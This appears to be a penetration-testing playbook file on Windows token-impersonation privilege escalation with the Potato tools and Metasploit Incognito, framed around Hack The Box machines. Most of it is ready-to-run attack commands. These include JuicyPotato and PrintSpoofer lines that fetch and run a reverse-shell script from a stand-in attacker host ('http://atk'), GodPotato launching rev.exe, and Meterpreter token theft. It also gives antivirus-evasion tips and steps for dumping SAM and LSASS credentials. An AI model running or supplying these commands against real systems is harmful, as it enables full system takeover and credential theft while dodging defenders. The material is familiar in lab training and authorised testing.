# Token Impersonation (Potato attacks / Incognito)

> Service accounts that hold `SeImpersonatePrivilege` or
> `SeAssignPrimaryTokenPrivilege` can become SYSTEM by abusing the COM
> impersonation chain. The attack family is collectively called
> "Potato".

## Objective
Convert a low-privilege Windows service shell into SYSTEM by
impersonating a token that arrives via a forced authentication.

## When To Use
`whoami /priv` shows `SeImpersonatePrivilege` or
`SeAssignPrimaryTokenPrivilege` (these privileges are typical for IIS
worker processes, MSSQL service accounts, Jenkins workers, etc.).

## Detection Indicators

```powershell
whoami /priv
# look for:
# SeImpersonatePrivilege          Enabled
# SeAssignPrimaryTokenPrivilege   Enabled
```

## Enumeration Strategy

```powershell
whoami /all
whoami /priv
whoami /groups
# look for: NT SERVICE\IUSRS, IIS APPPOOL\..., MSSQL$..., Jenkins...
```

## Exploitation Workflow

### Choose the right Potato

| Variant | OS Range | Notes |
|---|---|---|
| **Hot Potato** | Win 7 / 8 / Server 2008–2012 | NBNS spoof + WPAD; pre-2016 |
| **Rotten Potato** | Win 7 / 8 / 10 / Server 2012–2016 | COM-based |
| **Lonely Potato** | Win 10 (early) / 2016 | COM-based |
| **Juicy Potato** | Win 7 / 8 / 10 (≤1809) / 2008–2016 | Configurable CLSID |
| **Rogue Potato** | Win 10 (1809+) / 2019 | Patches Juicy |
| **PrintSpoofer** | Win 10 / 2019 | Spooler service |
| **GodPotato** | Win 8.1+ / 2012R2+ | RPC-based; broad coverage |
| **EfsPotato** | Win 10 / 2019 / 2022 | EFSRPC |
| **LocalPotato** | Win 10 (recent) / 2019 / 2022 | NTLM relay-based |

### Juicy Potato (Jeeves-era boxes)

```powershell
# requires a CLSID for the Service-with-SeImpersonate. https://github.com/ohpe/juicy-potato/tree/master/CLSID
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\Windows\Temp\who.txt" -t *
type C:\Windows\Temp\who.txt
# nt authority\system

# direct reverse shell
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://atk/p.ps1')" -t *
```

### PrintSpoofer (modern Windows)

```powershell
.\PrintSpoofer.exe -i -c cmd
# spawns interactive SYSTEM cmd
```

### GodPotato (broadest coverage)

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\rev.exe"
```

### Metasploit Incognito (token theft)

```
meterpreter > getuid
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

## Commands

```powershell
# upload via evil-winrm
upload PrintSpoofer.exe
upload GodPotato.exe
upload JuicyPotato.exe

# stage a reverse shell payload
$wc = New-Object Net.WebClient
$wc.DownloadFile('http://atk/Invoke-PowerShellTcp.ps1', 'C:\Windows\Temp\p.ps1')

# trigger
.\PrintSpoofer.exe -i -c "powershell -ep bypass -c .\Windows\Temp\p.ps1"
```

## Tool Usage

- **JuicyPotato.exe** — pre-2019, configurable CLSID.
- **RoguePotato.exe** — for 1809+ where Juicy is patched; needs a
  forwarded port or remote attacker.
- **PrintSpoofer.exe** — works on Win 10 / Server 2019.
- **GodPotato.exe** — broad coverage; recommended default in 2024+.
- **EfsPotato.exe** — alternative for Server 2022 hardened cases.
- **Metasploit `incognito`** — token theft via meterpreter.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong Potato for OS | Exploit fails silently | Match Potato to OS table above |
| Bad CLSID in Juicy Potato | "Failed to perform" | Use a CLSID known to work for that OS |
| Antivirus catches the binary | Quick deletion / kill | Use `defender exclusion` or different variant |
| Reverse shell from cmd dies | Listener disconnects | Use a daemonised payload or PowerShell directly |
| Forgetting to upload via writable path | Access denied | Use `C:\Windows\Temp` |

## Decision-Making Logic

```
SeImpersonate / SeAssignPrimaryToken present
  └─ Windows version?
       ├─ Win 7-10 (≤1803), Server 2008-2016 → Juicy Potato
       ├─ Win 10 (1809+), Server 2019/2022   → PrintSpoofer / GodPotato
       └─ unknown / patched                   → GodPotato (broadest)
```

## Pivot Opportunities

After SYSTEM:
- Dump SAM/SYSTEM/SECURITY → secretsdump LOCAL.
- Dump LSASS → cleartext / Kerberos keys.
- Read `C:\Users\Administrator\Desktop\root.txt`.

## OPSEC Considerations

- Each Potato variant has known signatures.
- Defender flags pre-built binaries; rebuild from source or use
  in-memory variants (`SharpJuicyPotato`, `SharpRoguePotato`).
- The privilege escalation event (4672 — Special privileges assigned)
  is logged; spikes from a service account pulling SYSTEM are a clear
  signal.
- Avoid running from a public web shell context; spawn into a less
  visible process.

## Real HTB Examples

- **Jeeves** — RottenPotato in MSF Incognito module.
- **Bastard** — Drupal RCE → IIS App Pool → JuicyPotato.
- **Bounty** — IIS web.config + JuicyPotato.
- **Conceal** — HTTP API foothold + JuicyPotato.
- **Devel, Granny, Grandpa** — IIS WebDAV + JuicyPotato.
- **SecNotes** — multiple privesc paths including impersonation.

## Alternative Techniques

- **DCOM-based privesc** — older, manual COM hijacking.
- **DLL hijacking on a service** — when Potato fails.
- **Service binary replace** — when the service can be restarted.

## Automation Opportunities

```powershell
# winPEAS auto-detects SeImpersonate and recommends a Potato
.\winPEASany.exe quiet | Select-String -Pattern "SeImpersonate" -Context 0,3
```

## Checklist

- [ ] `whoami /priv` confirms SeImpersonate / SeAssignPrimaryToken
- [ ] OS version identified (`systeminfo`)
- [ ] Right Potato variant chosen
- [ ] Binary uploaded to `C:\Windows\Temp`
- [ ] Listener ready
- [ ] Trigger and confirm SYSTEM

## Related Skills

- [`windows-privesc/kernel-exploits.md`](kernel-exploits.md)
- [`windows-privesc/dll-hijacking.md`](dll-hijacking.md)
- [`tool-usage/winpeas.md`](../tool-usage/winpeas.md)
- [`methodology/05-windows-attack-flow.md`](../methodology/05-windows-attack-flow.md)
